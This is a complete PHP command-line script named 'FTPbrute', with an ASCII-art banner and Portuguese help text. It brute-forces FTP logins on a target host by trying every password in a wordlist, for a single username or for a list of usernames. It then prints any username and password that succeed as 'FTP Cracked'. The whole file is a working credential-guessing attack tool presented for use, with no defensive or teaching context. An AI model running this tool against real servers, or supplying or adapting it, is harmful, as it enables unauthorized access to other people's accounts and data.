<?php
	error_reporting(0);
	set_time_limit(0);
	banner();
	

	function banner(){
echo "
+-'~`---------------------------------/\--
 ||-------------------------------- \\\\\\  \/~)
 ||  Pablo Santhus - FTPbrute         \\\\\\  \/_
  |~~~~~~~~-________________-_________________\ ~--_
  !---------|_________       ------~~~~~(--   )--~~
                      \ /~~~~\~~\   )--- \_ /(
                       ||     |  | \   ()   \\
                       \\____/_ / ()\        \\
                        `~~~~~~~~~-. \        \\
                                    \ \  <($)> \\
                                     \ \        \\
                                      \ \        \\
                                       \ \        \\
                                        \ \  ()    \|
                                        _\_\__====~~~
\n";
print "FTPbrute\n";
print "Coded By Pablo Santhus\n";
print "AJUDA: php ftpbrute.php -h \n";
print "\n";
sleep(1);
}

	$host = $argv[1];
	$port =	21;
	$time = 30;
	
	

	function help(){
		echo "\n";
		echo " opcoes[-u, -w, -h]";
		echo "\n\n";
		echo "   -u"."      ". "Atribui um usuario.\n";
		echo "   -w"."      ". "Atribui uma wordlist.\n";
		echo "   -h"."      ". "Exibe o menu de ajuda.\n";
		echo "-user"."      ". "Realiza um brute force no usuario\n";
		echo "\n\n";
		echo "  exemplo: php ftpbrute.php 127.0.0.1 -u usuario -w wordlist.txt\n";
		echo "  exemplo: php ftpbrute.php 127.0.0.1 -user users.txt -w wordlist.txt\n";
	}
		if($argv[1] == "-h"){
			help();
		}

		if($argv[1] == "-u" or $argv[1] == "-user"){
		echo "Falta adicionar o host!\n";
		exit;
		}
		if(!file($argv[5])){
			echo $argv[5] . " nao encontrada!\n";
			exit;
		}
		if($argv[2] == "-user" && !file($argv[3])){
			echo $argv[3] . " nao encontrada!\n";
			exit;
		}

	if($argv[2] == "-user" && $argv[4] == "-w"){

		$listu = file_get_contents($argv[3]);
		$list = explode("\n", $listu);
		$list = str_replace("\r", "", $list);
		$list = str_replace("\n", "", $list);

		foreach($list as $usr){
			$password = file_get_contents($argv[5]);
			$pass = explode("\n", $password);
			foreach($pass as $pwd){
				echo "[-] FTP NOT Cracked: " . $usr . "  " . $pwd . "\n";
				$connect = ftp_connect($host, $port, $time);
				$login = ftp_login($connect, $usr, $pwd);

				if(!$login){
					ftp_close($connect);
					str_replace("\r\n", "", $pwd);
				}else{
					print "----------------------------------------------------";
					print "\n";
					print "\n";
					echo "   [+] FTP Cracked: "."Host: ".$host." usuario: " . $usr. " senha: ".$pwd . "\n";
					print "\n";
					print "----------------------------------------------------";
					exit;
			}
		}
		echo "\n";
	echo "Nao foi possivel crackear a senha use uma wordlist mais potente!";
	echo "\n";
	}
	echo "\n";
	echo "Nao foi possivel crackear usuario nem senha use uma wordlist mais potente!";
	echo "\n";
}

if(isset($argv[5]) && $argv[2] == "-u" && $argv[4] == "-w"){
	
	$user = $argv[3];
	$list = file_get_contents($argv[5]);

	$wordl = explode("\n", $list);
	foreach($wordl as $word){
		echo "[-] FTP NOT Cracked: " . $user . "  " . $word . "\n";
		$con = ftp_connect($host,$port,$time);
		$log = ftp_login($con, $user, $word);

	if(!$log){
		ftp_close($con);
		str_replace("\r\n", "", $word);
	}else{
		print "----------------------------------------------------";
		print "\n";
		print "\n";
		echo "   [+] FTP Cracked: "."Host: ".$host." usuario: " . $user. " senha: ".$word . "\n";
		print "\n";
		print "----------------------------------------------------";
		exit;
		}
	}
	echo "\n";
	echo "Nao foi possivel crackear a senha use uma wordlist mais potente!";
	echo "\n";
}

?>